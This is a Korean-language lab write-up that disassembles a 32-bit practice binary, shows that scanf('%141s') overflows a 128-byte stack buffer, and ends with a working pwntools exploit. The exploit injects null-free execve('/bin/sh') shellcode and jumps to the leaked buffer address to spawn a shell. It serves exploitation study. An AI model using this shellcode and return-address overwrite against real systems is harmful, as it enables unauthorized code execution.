# Exploitation 2 분석

## 어셈블리 분석

### main

```asm
0x80485dc <main+3>     add    esp, -0x80
```

- `add esp, -0x80` → `sub esp, 0x80`
- `esp` 레지스터에 `0x80(128 바이트)` 만큼 감소시켜 스택 공간 확보

```asm
0x80485df <main+6>     call   initialize 
```

- `initialize` 함수 호출

#### initialize

- exploitation 1 과 동일

#### initialize 최종 c 언어

```c
void initialize() {
    setvbuf(0xf7f9d5c0 (_IO_2_1_stdin_), 0(NULL), 2, 0);
    setvbuf(0xf7f9dd40 (_IO_2_1_stdout_), 0(NULL), 2, 0);
    signal(0xe(14), alarm_handler);
    alarm(0x1e(30));
}
```

### main

```asm
0x80485e4 <main+11>          lea    eax, [ebp - 0x80]
```

- 현재 `ebp` 레지스터의 값: `0xffffcf38`
- `[ebp - 0x80]` 연산 수행 → `0xffffcf38` - `0x80` = `0xffffceb8`
- `0xffffceb8` 주소의 값 확인: `0xf7fbf720`: `0x804830f`
- `0x804830f` 주소의 값 확인: **0x804830f: "GLIBC_2.0"**
- `eax` 레지스터 에게 `0xffffceb8` 주소를 로드

```asm
0x80485e7 <main+14>          push   eax
```

- `eax` 값 `0xffffceb8`을 `stack`에 푸쉬

```asm
0x80485e8 <main+15>          push   0x8048699
```

- `0x8048699` 값을 `stack`에 푸쉬
- `0x8048699` 값 분석: `0x8048699`: `"buf = (%p)\n"`

```asm
0x80485ed <main+20>          call   printf@plt
```

- `printf` 함수 호출
> 최종: **printf(buf = (%p)\n, 0xffffceb8);**

```asm
0x80485f2 <main+25>          add    esp, 8
```

- `printf()` 함수 호출 이후, `add esp, 8` 명령어로
`push`로 쌓았던 **2개의 함수 인자(8바이트)**를 `stack`에서 정리함

```asm
0x80485f5 <main+28>          lea    eax, [ebp - 0x80]
```
- 현재 `ebp` 레지스터의 값: `0xffffcf38`
- `[ebp - 0x80]` 연산 수행 → `0xffffcf38` - `0x80` = `0xffffceb8`
- `0xffffceb8` 주소의 값 확인: `0xf7fbf720`: `0x804830f`
- `0x804830f` 주소의 값 확인: **0x804830f: "GLIBC_2.0"**
- `eax` 레지스터 에게 `0xffffceb8` 주소를 로드

```asm
0x80485f8 <main+31>          push   eax
```

- `eax` 값 `0xffffceb8`을 `stack`에 푸쉬

```asm
0x80485f9 <main+32>          push   0x80486a5
```

- `0x80486a5` 값을 `stack`에 푸쉬
- `0x80486a5`의 값 분석: **0x80486a5: "%141s"**

```asm
0x80485fe <main+37>    call   __isoc99_scanf@plt
```

- `scanf` 함수 호출
> 최종: **scanf(%141s, 0xffffceb8);**

```asm
0x8048603  <main+42>    add    esp, 8
```

- `scanf()` 함수 호출 이후, `add esp, 8` 명령어로
`push`로 쌓았던 **2개의 함수 인자(8바이트)**를 `stack`에서 정리함

```asm
0x8048606  <main+45>    mov    eax, 0                EAX => 0
0x804860b  <main+50>    leave  
0x804860c  <main+51>    ret 
```

- `eax`에 리턴 값 `0` 설정 후, `leave → ret`를 통해 스택 프레임 정리 및 호출한 함수로 복귀 → **`main` 함수 종료**

#### main 함수 C언어 추측

```c
int main() {
    char buf[0x80]; // 0xffffceb8 == buf 변수 추정
    initialize();
    printf(buf = (%p)\n, buf);
    scanf(%141s, buf);
}
```

> **위 코드는 실제 소스코드를 보지 않고, 리버싱 분석만으로 추정한 C 코드입니다.**

---

## 결론

### 구조 분석

- `buf` 변수를 이용해 사용자 입력을 받음.
- `printf` 함수는 `buf`의 주소(스택 위치)를 출력.
- `scanf("%141s", buf);`를 통해 최대 **141바이트의 문자열**을 입력.
- 이로 인해 **버퍼 오버플로우 발생 가능성이 충분** (`buf`는 128바이트 → 초과 입력 시 EBP/RIP 덮을 수 있음).

---

### 분석 환경

- Ubuntu 16.04
- Arch:     i386-32-little
- RELRO:    No RELRO
- Stack:    No canary found
- NX:       NX disabled
- PIE:      No PIE (0x8048000)
- RWX:      Has RWX segments

---

### 파이썬 스크립트

```python
from pwn import *

context(os='linux', arch='i386')

p = process("./exploitation_02")

data = p.recv(20)

decode_data = data.decode()
addr = decode_data.split()[2].replace("(","").replace(")","")
addr_int = int(addr, 16)

shellcode = (b'\x31\xc0'              # xor    eax, eax
             b'\x50'                  # push   eax
             b'\x68\x6e\x2f\x73\x68'  # push   0x68732f6e ; "n/sh"
             b'\x68\x2f\x2f\x62\x69'  # push   0x69622f2f ; "//bi"
             b'\x89\xe3'              # mov    ebx, esp
             b'\x31\xc9'              # xor    ecx, ecx
             b'\x31\xd2'              # xor    edx, edx
             b'\xb0\x08'              # mov    al, 8
             b'\x40'                  # inc    eax        ; 9
             b'\x40'                  # inc    eax        ; 10
             b'\x40'                  # inc    eax        ; 11 (0x0b, execve)
             b'\xcd\x80'              # int    0x80       ; syscall
            )

payload = shellcode + b"A" * (128 - len(shellcode)) + b"B" * 4 + p32(addr_int)

p.sendline(payload)

p.interactive()
```

- 대상 프로그램은 `scanf("%s", buf)`를 통해 입력을 받음

- 이 방식은 **널 바이트(`\x00`)를 만나면 입력이 중단**되므로, 쉘코드 내에 `\x00`이 포함되면 그 즉시 입력을 중단함.

- 따라서 **널 바이트가 없는(shellcode-free-of-null-bytes) 쉘코드**를 구성해야 함


